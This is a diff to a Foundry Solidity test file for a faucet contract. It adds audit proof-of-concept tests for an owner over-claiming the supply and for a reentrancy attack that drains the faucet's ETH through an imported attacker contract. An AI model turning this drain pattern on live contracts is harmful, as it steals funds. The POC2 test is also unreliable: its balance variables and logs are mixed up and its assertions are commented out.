@@ -9,9 +9,12 @@ import {DeployRaiseboxContract} from "../script/DeployRaiseBoxFaucet.s.sol";
 import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
 
+import {FaucetAttacker} from "./FaucetAttacker.sol";
+
 contract TestRaiseBoxFaucet is Test {
     RaiseBoxFaucet raiseBoxFaucet;
     DeployRaiseboxContract raiseBoxDeployer;
+    FaucetAttacker faucetAttacker;
 
     // Test: Users
     address user1 = makeAddr("user1");
@@ -26,6 +29,7 @@ contract TestRaiseBoxFaucet is Test {
     address user10 = makeAddr("user 10");
     address user11 = makeAddr("user 11");
     address user12 = makeAddr("user 12");
+    address attacker = makeAddr("attacker");
 
     address owner;
     address raiseBoxFaucetContractAddress;
@@ -58,10 +62,12 @@ contract TestRaiseBoxFaucet is Test {
 
         vm.deal(raiseBoxFaucetContractAddress, 1 ether);
         vm.deal(owner, 100 ether);
+        
 
         advanceBlockTime(3 days); // 3 days
     }
 
+//test from dev
     function testFaucetBalanceIsAlwaysChecksum() public {
         address[5] memory claimers = [user1, user2, user3, user4, user5];
         uint256 userClaims;
@@ -78,6 +84,7 @@ contract TestRaiseBoxFaucet is Test {
             assertTrue(INITIAL_SUPPLY_MINTED == (balanceLeft + userClaims));
         }
     }
+
 
     function testOnlyOwnerCanAdjustDailyClaimLimit() public {
         vm.prank(owner);
@@ -820,7 +827,8 @@ contract TestRaiseBoxFaucet is Test {
             "Token Mint: Supply should equal amount minted"
         );
     }
-    
+
+//audit test    
     //POC 1
     function testOwnerCanClaimAlmostAllTheSupplyBurningOneToken() public {
         vm.startPrank(owner);
@@ -838,6 +846,29 @@ contract TestRaiseBoxFaucet is Test {
         console.log("owner Balance: ", raiseBoxFaucet.balanceOf(owner));
         console.log("result:        ", initialOwnerBalance + allTokenMintable -1);
         assertEq(raiseBoxFaucet.balanceOf(owner), initialOwnerBalance + allTokenMintable -1);
+    }
+
+    //POC2
+    function testReentrancyVulnerabilityOnClaimFaucetTokens() public {
+        vm.deal(attacker, 1 ether);
+        uint256 faucetInitialBalance = address(raiseBoxFaucet).balance;
+        uint256 attackerInitialBalance = address(raiseBoxFaucet).balance;
+
+        vm.startPrank(attacker);
+        faucetAttacker = new FaucetAttacker{value: 0.9 ether}(address(raiseBoxFaucet));
+        faucetAttacker.attack();
+        vm.stopPrank();
+
+        uint256 faucetFinalBalance = address(raiseBoxFaucet).balance;
+        uint256 attackerFinalBalance = address(raiseBoxFaucet).balance;
+        uint256 stolenEthAmount = faucetInitialBalance - faucetFinalBalance;
+        
+        console2.log("initial faucet balance:        ", faucetFinalBalance);
+        console2.log("final faucet balance:          ", faucetFinalBalance);
+        console2.log("eth amount to send every time:   ", raiseBoxFaucet.sepEthAmountToDrip() );
+
+        //assertTrue(faucetFinalBalance < raiseBoxFaucet.sepEthAmountToDrip());
+        //assertEq(attackerFinalBalance , attackerInitialBalance + stolenEthAmount);
     }
 
 }
